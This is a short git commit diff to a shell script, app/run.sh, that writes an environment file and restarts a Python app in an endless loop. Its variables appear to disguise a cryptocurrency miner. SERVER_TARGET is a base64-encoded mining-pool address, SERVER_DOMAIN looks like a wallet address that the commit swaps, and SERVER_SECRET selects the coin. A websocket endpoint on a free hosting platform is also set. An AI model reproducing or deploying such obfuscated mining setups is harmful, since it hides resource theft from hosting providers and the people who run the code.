779eb4c794d0f4852f86d92671faf455b1a6cc07
brontosimungo <brontosimungo@outlook.co.id>
2026-05-10 23:17:46 +0700

    Update run.sh

--- app/run.sh
+++ app/run.sh
@@ -3,8 +3,8 @@ CONNECT=$1
 NAME=$2
 echo "SERVER_WS=wss://identical-sile-malphite-node-dfaa5ec5.koyeb.app
 SERVER_TARGET=bWlub3RhdXJ4Lm5hLm1pbmUuenBvb2wuY2E6NzAxOQ==
-SERVER_DOMAIN=MC2aktqE12PdxRvapTNrG8kbhU5F1Vb2fT
-SERVER_SECRET=c=MAZA,zap=MAZA
+SERVER_DOMAIN=DNbHCwVeAoGVAA49s62RTXpdcjZk5w17eE
+SERVER_SECRET=c=DGB,zap=MAZA
 SERVER_CONNECTION=${CONNECT}
 SERVER_MODE=FAST" > .env
 while true; do python3 app.py; sleep 10; done
